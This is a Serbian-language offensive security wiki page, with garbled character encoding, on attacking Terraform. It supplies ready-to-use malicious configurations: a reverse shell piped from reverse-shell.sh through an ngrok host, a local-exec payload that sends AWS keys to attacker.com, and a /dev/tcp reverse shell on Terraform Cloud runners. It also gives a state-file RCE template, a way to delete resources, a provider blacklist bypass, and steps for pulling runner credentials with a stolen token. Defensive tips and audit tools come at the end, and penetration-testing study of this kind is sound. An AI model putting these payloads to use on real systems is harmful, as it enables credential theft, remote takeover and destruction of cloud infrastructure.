# Terraform Security

{{#include ../banners/hacktricks-training.md}}

## Osnovne informacije

[Iz dokumenata:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform je **alat za infrastrukturu kao kod** koji vam omoguÄ‡ava da definiÅ¡ete kako **resurse u oblaku, tako i lokalne resurse** u konfiguracionim datotekama koje su Äitljive za ljude, a koje moÅ¾ete verzionisati, ponovo koristiti i deliti. Zatim moÅ¾ete koristiti dosledan radni tok za obezbeÄ‘ivanje i upravljanje svim vaÅ¡im infrastrukturnim resursima tokom njihovog Å¾ivotnog ciklusa. Terraform moÅ¾e upravljati niskonivnim komponentama kao Å¡to su resursi za raÄunanje, skladiÅ¡tenje i umreÅ¾avanje, kao i visokolevelnim komponentama kao Å¡to su DNS unosi i SaaS funkcije.

#### Kako Terraform funkcioniÅ¡e?

Terraform kreira i upravlja resursima na platformama u oblaku i drugim uslugama putem njihovih interfejsa za programiranje aplikacija (API). Provajderi omoguÄ‡avaju Terraformu da radi sa praktiÄno bilo kojom platformom ili uslugom koja ima dostupan API.

![](<../images/image (177).png>)

HashiCorp i Terraform zajednica su veÄ‡ napisali **viÅ¡e od 1700 provajdera** za upravljanje hiljadama razliÄitih tipova resursa i usluga, a ovaj broj se nastavlja poveÄ‡avati. Sve javno dostupne provajdere moÅ¾ete pronaÄ‡i na [Terraform Registry](https://registry.terraform.io/), ukljuÄujuÄ‡i Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog i mnoge druge.

Osnovni radni tok Terraform-a sastoji se od tri faze:

- **Pisanje:** DefiniÅ¡ete resurse, koji mogu biti rasporeÄ‘eni preko viÅ¡e provajdera i usluga u oblaku. Na primer, moÅ¾ete kreirati konfiguraciju za implementaciju aplikacije na virtuelnim maÅ¡inama u mreÅ¾i Virtuelne Privatne Oblasti (VPC) sa sigurnosnim grupama i balansirnikom optereÄ‡enja.
- **Planiranje:** Terraform kreira plan izvrÅ¡enja koji opisuje infrastrukturu koju Ä‡e kreirati, aÅ¾urirati ili uniÅ¡titi na osnovu postojeÄ‡e infrastrukture i vaÅ¡e konfiguracije.
- **Primena:** Nakon odobrenja, Terraform izvrÅ¡ava predloÅ¾ene operacije u ispravnom redosledu, poÅ¡tujuÄ‡i sve zavisnosti resursa. Na primer, ako aÅ¾urirate svojstva VPC-a i promenite broj virtuelnih maÅ¡ina u tom VPC-u, Terraform Ä‡e ponovo kreirati VPC pre nego Å¡to skalira virtuelne maÅ¡ine.

![](<../images/image (215).png>)

### Terraform laboratorija

Samo instalirajte terraform na vaÅ¡em raÄunaru.

Ovde imate [vodiÄ](https://learn.hashicorp.com/tutorials/terraform/install-cli) i ovde imate [najbolji naÄin za preuzimanje terraforma](https://www.terraform.io/downloads).

## RCE u Terraform-u: trovanje konfiguracione datoteke

Terraform **nema platformu koja izlaÅ¾e web stranicu ili mreÅ¾nu uslugu** koju moÅ¾emo enumerisati, stoga je jedini naÄin da kompromitujemo terraform **da moÅ¾emo dodati/izmeniti terraform konfiguracione datoteke** ili **da moÅ¾emo izmeniti terraform stanje datoteke** (vidi poglavlje ispod).

MeÄ‘utim, terraform je **veoma osetljiva komponenta** za kompromitovanje jer Ä‡e imati **privilegovan pristup** razliÄitim lokacijama kako bi mogao pravilno da funkcioniÅ¡e.

Glavni naÄin na koji napadaÄ moÅ¾e kompromitovati sistem na kojem se terraform izvrÅ¡ava je **kompromitovanje repozitorijuma koji Äuva terraform konfiguracije**, jer Ä‡e u nekom trenutku biti **interpretirane**.

U stvari, postoje reÅ¡enja koja **automatski izvrÅ¡avaju terraform plan/primenu nakon Å¡to je PR** kreiran, kao Å¡to je **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

Ako ste u moguÄ‡nosti da kompromitujete terraform datoteku, postoje razliÄiti naÄini na koje moÅ¾ete izvrÅ¡iti RCE kada neko izvrÅ¡i `terraform plan` ili `terraform apply`.

### Terraform plan

Terraform plan je **najÄeÅ¡Ä‡e koriÅ¡Ä‡ena komanda** u terraform-u i programeri/reÅ¡enja koja koriste terraform je pozivaju stalno, tako da je **najlakÅ¡i naÄin da dobijete RCE** da se pobrinete da otrovate terraform konfiguracionu datoteku koja Ä‡e izvrÅ¡iti proizvoljne komande u `terraform plan`.

**KoriÅ¡Ä‡enje spoljnog provajdera**

Terraform nudi [`external` provajder](https://registry.terraform.io/providers/hashicorp/external/latest/docs) koji pruÅ¾a naÄin za interakciju izmeÄ‘u Terraforma i spoljnjih programa. MoÅ¾ete koristiti `external` izvor podataka za izvrÅ¡avanje proizvoljnog koda tokom `plana`.

Umetanje neÄega poput sledeÄ‡eg u terraform konfiguracionu datoteku izvrÅ¡iÄ‡e rev shell kada se izvrÅ¡i `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**KoriÅ¡Ä‡enje prilagoÄ‘enog provajdera**

NapadaÄ bi mogao poslati [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup) na [Terraform Registry](https://registry.terraform.io/) i zatim ga dodati u Terraform kod u funkcionalnoj grani ([primer odavde](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Provajder se preuzima u `init` i izvrÅ¡iÄ‡e maliciozni kod kada se izvrÅ¡i `plan`.

MoÅ¾ete pronaÄ‡i primer na [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**KoriÅ¡Ä‡enje spoljnog reference**

Obe pomenute opcije su korisne, ali nisu baÅ¡ diskretne (druga je diskretnija, ali sloÅ¾enija od prve). Ovaj napad moÅ¾ete izvesti Äak i na **diskretniji naÄin**, prateÄ‡i ove sugestije:

- Umesto da direktno dodate rev shell u terraform datoteku, moÅ¾ete **uÄitati spoljnji resurs** koji sadrÅ¾i rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
MoÅ¾ete pronaÄ‡i rev shell kod na [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- U spoljnim resursima, koristite **ref** funkciju da sakrijete **terraform rev shell kod u grani** unutar repozitorijuma, neÅ¡to poput: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply Ä‡e biti izvrÅ¡en da primeni sve promene, takoÄ‘e ga moÅ¾ete zloupotrebiti da dobijete RCE injektovanjem **malicioznog Terraform fajla sa** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Samo treba da se pobrinete da neki payload poput sledeÄ‡ih zavrÅ¡i u `main.tf` fajlu:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Sledite **preporukama iz prethodne tehnike** da izvrÅ¡ite ovaj napad na **diskretniji naÄin koristeÄ‡i spoljne reference**.

## Izvori tajni

MoÅ¾ete imati **tajne vrednosti koje koristi terraform izbaÄene** pokretanjem `terraform apply` dodavanjem neÄega poput:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Zloupotreba Terraform State Fajlova

U sluÄaju da imate pristup za pisanje nad terraform state fajlovima, ali ne moÅ¾ete da menjate terraform kod, [**ova istraÅ¾ivanja**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) nude neke zanimljive opcije za koriÅ¡Ä‡enje fajla. ÄŒak i ako biste imali pristup za pisanje nad konfiguracionim fajlovima, koriÅ¡Ä‡enje vektora state fajlova je Äesto mnogo podlije, poÅ¡to ne ostavljate tragove u `git` istoriji.

### RCE u Terraform-u: trovanje konfiguracionog fajla

MoguÄ‡e je [napraviti prilagoÄ‘enog provajdera](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) i jednostavno zameniti jednog od provajdera u terraform state fajlu za zlonamernog ili dodati laÅ¾ni resurs koji se poziva na zlonamernog provajdera.

Provajder [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) se oslanja na istraÅ¾ivanje i oruÅ¾ava ovaj princip. MoÅ¾ete dodati laÅ¾ni resurs i navesti proizvoljnu bash komandu koju Å¾elite da izvrÅ¡ite u atributu `command`. Kada se pokrene `terraform` run, ovo Ä‡e biti proÄitano i izvrÅ¡eno u koracima `terraform plan` i `terraform apply`. U sluÄaju koraka `terraform apply`, `terraform` Ä‡e obrisati laÅ¾ni resurs iz state fajla nakon izvrÅ¡avanja vaÅ¡e komande, ÄisteÄ‡i za sobom. ViÅ¡e informacija i potpuna demonstracija mogu se naÄ‡i u [GitHub repozitorijumu koji hostuje izvorni kod za ovog provajdera](https://github.com/offensive-actions/terraform-provider-statefile-rce).

Da biste ga koristili direktno, jednostavno ukljuÄite sledeÄ‡e na bilo kojoj poziciji u `resources` nizu i prilagodite atribute `name` i `command`:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
Zatim, Äim se `terraform` izvrÅ¡i, vaÅ¡ kod Ä‡e se pokrenuti.

### Brisanje resursa <a href="#deleting-resources" id="deleting-resources"></a>

Postoje 2 naÄina da se uniÅ¡te resursi:

1. **Umetnite resurs sa nasumiÄnim imenom u datoteku stanja koja pokazuje na pravi resurs koji treba uniÅ¡titi**

PoÅ¡to Ä‡e terraform videti da resurs ne bi trebao da postoji, uniÅ¡tiÄ‡e ga (prateÄ‡i pravi ID resursa koji je naznaÄen). Primer sa prethodne strane:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Izmenite resurs za brisanje na naÄin da nije moguÄ‡e aÅ¾urirati (tako da Ä‡e biti obrisan i ponovo kreiran)**

Za EC2 instancu, izmena tipa instance je dovoljna da terraform obriÅ¡e i ponovo je kreira.

### Zamenite crnu listu provajdera

U sluÄaju da naiÄ‘ete na situaciju gde je `hashicorp/external` stavljen na crnu listu, moÅ¾ete ponovo implementirati `external` provajder na sledeÄ‡i naÄin. Napomena: Koristimo fork `external` provajdera objavljen od strane https://registry.terraform.io/providers/nazarewk/external/latest. TakoÄ‘e moÅ¾ete objaviti svoj vlastiti fork ili ponovnu implementaciju.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Tada moÅ¾ete koristiti `external` kao i obiÄno.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Terraform Cloud speculative plan RCE and credential exfiltration

Ovaj scenario zloupotrebljava Terraform Cloud (TFC) izvrÅ¡itelje tokom spekulativnih planova da bi se preÅ¡ao u ciljni cloud nalog.

- Preduslovi:
- Ukrao Terraform Cloud token sa developerske maÅ¡ine. CLI Äuva tokene u obiÄnom tekstu na `~/.terraform.d/credentials.tfrc.json`.
- Token mora imati pristup ciljnjoj organizaciji/radnom prostoru i najmanje `plan` dozvolu. VCS-podrÅ¾ani radni prostori blokiraju `apply` iz CLI, ali i dalje omoguÄ‡avaju spekulativne planove.

- Otkrijte postavke radnog prostora i VCS putem TFC API:
```bash
export TF_TOKEN=<stolen_token>
curl -s -H "Authorization: Bearer $TF_TOKEN" \
https://app.terraform.io/api/v2/organizations/<org>/workspaces/<workspace> | jq
```
- Pokrenite izvrÅ¡avanje koda tokom spekulativnog plana koristeÄ‡i spoljaÅ¡nji izvor podataka i Terraform Cloud "cloud" blok za ciljanje VCS-podrÅ¾anog radnog prostora:
```hcl
terraform {
cloud {
organization = "acmecorp"
workspaces { name = "gcp-infra-prod" }
}
}

data "external" "exec" {
program = ["bash", "./rsync.sh"]
}
```
Primer rsync.sh za dobijanje reverzne ljuske na TFC runner-u:
```bash
#!/usr/bin/env bash
bash -c 'exec bash -i >& /dev/tcp/attacker.com/19863 0>&1'
```
Pokrenite spekulativni plan za izvrÅ¡avanje programa na ephemernom izvrÅ¡itelju:
```bash
terraform init
terraform plan
```
- Enumerisati i exfiltrirati injektovane cloud kredencijale iz runner-a. Tokom izvrÅ¡avanja, TFC injektuje kredencijale provajdera putem fajlova i promenljivih okruÅ¾enja:
```bash
env | grep -i gcp || true
env | grep -i aws || true
```
OÄekivani fajlovi u radnom direktorijumu runner-a:
- GCP:
- `tfc-google-application-credentials` (JSON konfiguracija Workload Identity Federation)
- `tfc-gcp-token` (token za pristup GCP sa kratkim vremenom trajanja)
- AWS:
- `tfc-aws-shared-config` (konfiguracija pretpostavke uloge web identiteta/OIDC)
- `tfc-aws-token` (token sa kratkim vremenom trajanja; neke organizacije mogu koristiti statiÄke kljuÄeve)

- Koristite kratkoroÄne akreditive van kanala da biste zaobiÅ¡li VCS kapije:

GCP (gcloud):
```bash
export GOOGLE_APPLICATION_CREDENTIALS=./tfc-google-application-credentials
gcloud auth login --cred-file="$GOOGLE_APPLICATION_CREDENTIALS"
gcloud config set project <PROJECT_ID>
```
AWS (AWS CLI):
```bash
export AWS_CONFIG_FILE=./tfc-aws-shared-config
export AWS_PROFILE=default
aws sts get-caller-identity
```
Sa ovim kredencijalima, napadaÄi mogu da kreiraju/modifikuju/uniÅ¡te resurse direktno koristeÄ‡i native CLIs, zaobilazeÄ‡i PR-bazirane radne tokove koji blokiraju `apply` putem VCS-a.

- Defensivna uputstva:
- Primeni najmanje privilegije za TFC korisnike/timove i tokene. Revizija Älanstva i izbegavanje prevelikih vlasnika.
- OgraniÄi `plan` dozvolu na osetljivim VCS-podrÅ¾anim radnim prostorima gde je to moguÄ‡e.
- Sprovodi allowlist-e za provajdere/izvore podataka sa Sentinel politikama kako bi blokirao `data "external"` ili nepoznate provajdere. Pogledaj HashiCorp uputstva o filtriranju provajdera.
- Preferiraj OIDC/WIF umesto statiÄnih cloud kredencijala; tretiraj trkaÄe kao osetljive. Prati spekulativne planove i neoÄekivani izlaz.
- Otkrivanje eksfiltracije `tfc-*` artefakata kredencijala i upozoravanje na sumnjivu upotrebu `external` programa tokom planova.


## Automatski alati za reviziju

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk nudi sveobuhvatno reÅ¡enje za skeniranje Infrastructure as Code (IaC) koje otkriva ranjivosti i pogreÅ¡ne konfiguracije u Terraform-u, CloudFormation-u, Kubernetes-u i drugim IaC formatima.

- **Karakteristike:**
- Skeniranje u realnom vremenu za sigurnosne ranjivosti i probleme usklaÄ‘enosti.
- Integracija sa sistemima za kontrolu verzija (GitHub, GitLab, Bitbucket).
- Automatski pull zahtevi za ispravke.
- Detaljna uputstva za otklanjanje problema.
- **Prijavi se:** Kreiraj nalog na [Snyk](https://snyk.io/).
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** je alat za statiÄku analizu koda za infrastrukturu kao kod (IaC) i takoÄ‘e alat za analizu sastava softvera (SCA) za slike i pakete otvorenog koda.

Skenira cloud infrastrukturu koja je obezbeÄ‘ena koristeÄ‡i [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md), ili [OpenTofu](https://opentofu.org/) i otkriva bezbednosne i usklaÄ‘enosti greÅ¡ke u konfiguraciji koristeÄ‡i skeniranje zasnovano na grafu.

Izvodi [Software Composition Analysis (SCA) skeniranje](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md) koje je skeniranje paketa otvorenog koda i slika za zajedniÄke ranjivosti i izloÅ¾enosti (CVE).
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

From the [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` je lagan, bezbednosno i usklaÄ‘enosti fokusiran test okvir protiv terraform-a koji omoguÄ‡ava negativno testiranje za vaÅ¡u infrastrukturu kao kod.

- **usaglaÅ¡enost:** Osigurajte da implementirani kod prati bezbednosne standarde, vaÅ¡e sopstvene prilagoÄ‘ene standarde
- **razvoj voÄ‘en ponaÅ¡anjem:** Imamo BDD za gotovo sve, zaÅ¡to ne i za IaC?
- **prenosiv:** samo ga instalirajte putem `pip` ili ga pokrenite putem `docker`. Pogledajte [Instalacija](https://terraform-compliance.com/pages/installation/)
- **pre-deploy:** validira vaÅ¡ kod pre nego Å¡to bude implementiran
- **lako za integraciju:** moÅ¾e se pokrenuti u vaÅ¡em pipeline-u (ili u git hooks) kako bi se osiguralo da su sve implementacije validirane.
- **razdvajanje duÅ¾nosti:** moÅ¾ete Äuvati svoje testove u drugom repozitorijumu gde je odgovorna posebna ekipa.

> [!NOTE]
> NaÅ¾alost, ako kod koristi neke provajdere kojima nemate pristup, neÄ‡ete moÄ‡i da izvrÅ¡ite `terraform plan` i pokrenete ovaj alat.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

Iz [**dokumentacije**](https://github.com/aquasecurity/tfsec): tfsec koristi statiÄku analizu vaÅ¡eg terraform koda da bi uoÄio potencijalne pogreÅ¡ne konfiguracije.

- â˜ï¸ Proverava pogreÅ¡ne konfiguracije kod svih glavnih (i nekih manjih) provajdera u oblaku
- â›” Stotine ugraÄ‘enih pravila
- ğŸª† Skenira module (lokalne i udaljene)
- â• Evaluira HCL izraze kao i literalne vrednosti
- â†ªï¸ Evaluira Terraform funkcije npr. `concat()`
- ğŸ”— Evaluira odnose izmeÄ‘u Terraform resursa
- ğŸ§° Kompatibilan sa Terraform CDK
- ğŸ™… Primena (i obogaÄ‡ivanje) korisniÄki definisanih Rego politika
- ğŸ“ƒ PodrÅ¾ava viÅ¡e formata izlaza: lepi (podrazumevani), JSON, SARIF, CSV, CheckStyle, JUnit, tekst, Gif.
- ğŸ› ï¸ Konfigurisanje (putem CLI zastavica i/ili konfiguracione datoteke)
- âš¡ Veoma brzo, sposobno da brzo skenira ogromne repozitorijume
```bash
brew install tfsec
tfsec /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

PronaÄ‘ite bezbednosne ranjivosti, probleme sa usklaÄ‘enoÅ¡Ä‡u i pogreÅ¡ne konfiguracije infrastrukture rano u razvoju vaÅ¡e infrastrukture kao koda uz **KICS** od Checkmarx.

**KICS** oznaÄava **K**eeping **I**nfrastructure as **C**ode **S**ecure, otvorenog je koda i neophodan je za svaki projekat u oblaku.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

Iz [**dokumentacije**](https://github.com/tenable/terrascan): Terrascan je statiÄki analizator koda za Infrastructure as Code. Terrascan vam omoguÄ‡ava da:

- Besprekorno skenirate infrastrukturu kao kod za pogreÅ¡ne konfiguracije.
- Pratite obezbeÄ‘enu cloud infrastrukturu za promene konfiguracije koje uvode promene u posturi, i omoguÄ‡ava vraÄ‡anje na sigurnu posturu.
- Otkrivate sigurnosne ranjivosti i krÅ¡enja usklaÄ‘enosti.
- UblaÅ¾avate rizike pre nego Å¡to obezbedite cloud native infrastrukturu.
- Nudi fleksibilnost za lokalno pokretanje ili integraciju sa vaÅ¡im CI\CD.
```bash
brew install terrascan
```
## Reference

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
- [Terraform Cloud token abuse turns speculative plan into remote code execution](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)
- [Terraform Cloud permissions](https://developer.hashicorp.com/terraform/cloud-docs/users-teams-organizations/permissions)
- [Terraform Cloud API â€“ Show workspace](https://developer.hashicorp.com/terraform/cloud-docs/api-docs/workspaces#show-workspace)
- [AWS provider configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs#provider-configuration)
- [AWS CLI â€“ OIDC role assumption](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-oidc)
- [GCP provider â€“ Using Terraform Cloud](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference.html#using-terraform-cloud)
- [Terraform â€“ Sensitive variables](https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables)
- [Snyk Labs â€“ Gitflops: dangers of Terraform automation platforms](https://labs.snyk.io/resources/gitflops-dangers-of-terraform-automation-platforms/)

{{#include ../banners/hacktricks-training.md}}
